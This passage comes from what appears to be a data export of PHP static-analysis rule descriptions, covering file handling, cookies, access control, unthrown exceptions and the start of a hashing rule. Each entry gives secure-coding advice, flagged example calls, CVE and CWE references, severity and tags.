curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
//Execute the request.
$data = curl_exec($ch); // Questionable
curl_close($ch);
</pre>
<p>Guzzle</p>
<pre>
new GuzzleHttp\Client(); // Questionable
</pre>
<p>PECL HTTP</p>
<pre>
new http\Client\Request('GET', 'http://example.com'); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Sending HTTP requests is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule raises an issue on <a href=""http://php.net/manual/en/ref.filesystem.php"">filesystem functions</a> which have a high impact on security
and are often subject to injection. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
function handle_file($filename, $directory, $group, $data, $mode, $flags, $use_include_path, $pattern, $recursive, $context)
{
    file_put_contents($filename, $data, $flags); // Questionable
    copy($filename, $filename); // Questionable
    tmpfile(); // Questionable
    parse_ini_file($filename); // Questionable

    // The following calls will raise an issue if and only if the $filename or $directory is not hardcoded
    move_uploaded_file($filename, $filename); // Questionable
    rmdir($directory); // Questionable
    unlink($filename); // Questionable

    move_uploaded_file(""mypath1"", ""mypath2""); // Compliant
    rmdir(""dir1""); // Compliant
    unlink(""dir2""); // Compliant

    // The following functions can also be used to perform network requests (http, socket, ftp, etc...)
    // in some case they won't raise issues, see below.
    file_get_contents($filename, $use_include_path); // Questionable
    file($filename, $flags); // Questionable
    fopen($filename, $mode, $use_include_path); // Questionable
    readfile($filename, $use_include_path); // Questionable

    // No issue is raised if the source path, cleaned from prefixed wrappers (like 'rar://', 'zlib://', 'bzip2://', 'zip://', 'compress.zlib://',
    // 'compress.bzip2://', 'glob://', 'ogg://') still contains '://' without starting by 'file://'
    file_get_contents(""zip://http://example.com/file.zip"" $use_include_path); // Compliant
    file(""http://example.com"", $flags); // Compliant
    fopen(""http://example.com"", $mode, $use_include_path); // Compliant
    readfile(""http://example.com"", $use_include_path); // Compliant

    // No issue is created if a context is given as there is a high chance that it is not a filesystem access.
    // Note that this will create some false negatives with ""zip"" contexts.
    file_get_contents($filename, $use_include_path, $context); // Compliant
    file($filename, $flags, $context); // Compliant
    fopen($filename, $mode, $use_include_path, $context); // Compliant
    readfile($filename, $use_include_path, $context); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S4797,php,PHP,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule raises an issue on <a href=""http://php.net/manual/en/ref.filesystem.php"">filesystem functions</a> which have a high impact on security
and are often subject to injection. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
function handle_file($filename, $directory, $group, $data, $mode, $flags, $use_include_path, $pattern, $recursive, $context)
{
    file_put_contents($filename, $data, $flags); // Questionable
    copy($filename, $filename); // Questionable
    tmpfile(); // Questionable
    parse_ini_file($filename); // Questionable

    // The following calls will raise an issue if and only if the $filename or $directory is not hardcoded
    move_uploaded_file($filename, $filename); // Questionable
    rmdir($directory); // Questionable
    unlink($filename); // Questionable

    move_uploaded_file(""mypath1"", ""mypath2""); // Compliant
    rmdir(""dir1""); // Compliant
    unlink(""dir2""); // Compliant

    // The following functions can also be used to perform network requests (http, socket, ftp, etc...)
    // in some case they won't raise issues, see below.
    file_get_contents($filename, $use_include_path); // Questionable
    file($filename, $flags); // Questionable
    fopen($filename, $mode, $use_include_path); // Questionable
    readfile($filename, $use_include_path); // Questionable

    // No issue is raised if the source path, cleaned from prefixed wrappers (like 'rar://', 'zlib://', 'bzip2://', 'zip://', 'compress.zlib://',
    // 'compress.bzip2://', 'glob://', 'ogg://') still contains '://' without starting by 'file://'
    file_get_contents(""zip://http://example.com/file.zip"" $use_include_path); // Compliant
    file(""http://example.com"", $flags); // Compliant
    fopen(""http://example.com"", $mode, $use_include_path); // Compliant
    readfile(""http://example.com"", $use_include_path); // Compliant

    // No issue is created if a context is given as there is a high chance that it is not a filesystem access.
    // Note that this will create some false negatives with ""zip"" contexts.
    file_get_contents($filename, $use_include_path, $context); // Compliant
    file($filename, $flags, $context); // Compliant
    fopen($filename, $mode, $use_include_path, $context); // Compliant
    readfile($filename, $use_include_path, $context); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Handling files is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2017-11-30T14:19:39+0100,"<p>Creating a new <code>Exception</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($x &lt; 0)
  new Exception('$x must be nonnegative');
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($x &lt; 0)
  throw new Exception('$x must be nonnegative');
</pre>",php:S3984,php,PHP,"<p>Creating a new <code>Exception</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($x &lt; 0)
  new Exception('$x must be nonnegative');
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($x &lt; 0)
  throw new Exception('$x must be nonnegative');
</pre>",Exception should not be created without being thrown,[],MAJOR,['error-handling'],BUG
2018-07-31T12:24:47+0200,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
$value = ""1234 1234 1234 1234"";

// Review this cookie as it seems to send sensitive information (credit card number).
setcookie(""CreditCardNumber"", $value, $expire, $path, $domain, true, true); // Questionable
setrawcookie(""CreditCardNumber"", $value, $expire, $path, $domain, true, true); // Questionable

$_COOKIE[""name""]; // Questionable
$HTTP_COOKIE_VARS[""name""]; // Questionable

// Unseting and testing existence of a cookie is fine
unset($_COOKIE[""cookie""]); // Compliant
unset($HTTP_COOKIE_VARS[""cookie""]); // Compliant
isset($_COOKIE[""cookie""]); // Compliant
isset($HTTP_COOKIE_VARS[""cookie""]); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",php:S2255,php,PHP,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
$value = ""1234 1234 1234 1234"";

// Review this cookie as it seems to send sensitive information (credit card number).
setcookie(""CreditCardNumber"", $value, $expire, $path, $domain, true, true); // Questionable
setrawcookie(""CreditCardNumber"", $value, $expire, $path, $domain, true, true); // Questionable

$_COOKIE[""name""]; // Questionable
$HTTP_COOKIE_VARS[""name""]; // Questionable

// Unseting and testing existence of a cookie is fine
unset($_COOKIE[""cookie""]); // Compliant
unset($HTTP_COOKIE_VARS[""cookie""]); // Compliant
isset($_COOKIE[""cookie""]); // Compliant
isset($HTTP_COOKIE_VARS[""cookie""]); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",Using cookies is security-sensitive,[],MINOR,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions or configures this access. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>Questionable Code Example</h2>
<p>CakePHP</p>
<pre>
use Cake\Auth\BaseAuthorize;
use Cake\Controller\Controller;

abstract class MyAuthorize extends BaseAuthorize { // Questionable. Method extending Cake\Auth\BaseAuthorize.
    // ...
}

// Note that ""isAuthorized"" methods will only be detected in direct subclasses of Cake\Controller\Controller.
abstract class MyController extends Controller {
    public function isAuthorized($user) { // Questionable. Method called isAuthorized in a Cake\Controller\Controller.
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S4834,php,PHP,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions or configures this access. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>Questionable Code Example</h2>
<p>CakePHP</p>
<pre>
use Cake\Auth\BaseAuthorize;
use Cake\Controller\Controller;

abstract class MyAuthorize extends BaseAuthorize { // Questionable. Method extending Cake\Auth\BaseAuthorize.
    // ...
}

// Note that ""isAuthorized"" methods will only be detected in direct subclasses of Cake\Controller\Controller.
abstract class MyController extends Controller {
    public function isAuthorized($user) { // Questionable. Method called isAuthorized in a Cake\Controller\Controller.
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Controlling permissions is security-sensitive,[],CRITICAL,"['owasp-a5', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule creates an issue when one of the following functions are called: <a href=""http://php.net/manual/en/function.hash.php"">hash</a>, <a
href=""http://php.net/manual/en/function.hash-init.php"">hash_init</a>, <a href=""http://php.net/manual/en/function.crypt.php"">crypt</a>, <a
href=""http://php.net/manual/en/function.password-hash.php"">password_hash</a>, <a
href=""http://php.net/manual/en/function.hash-pbkdf2.php"">hash_pbkdf2</a>, <a
href=""http://php.net/manual/en/function.openssl-pbkdf2.php"">openssl_pbkdf2</a>, <a href=""http://php.net/manual/en/function.md5.php"">md5</a>, <a
href=""http://php.net/manual/en/function.sha1.php"">sha1</a></p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
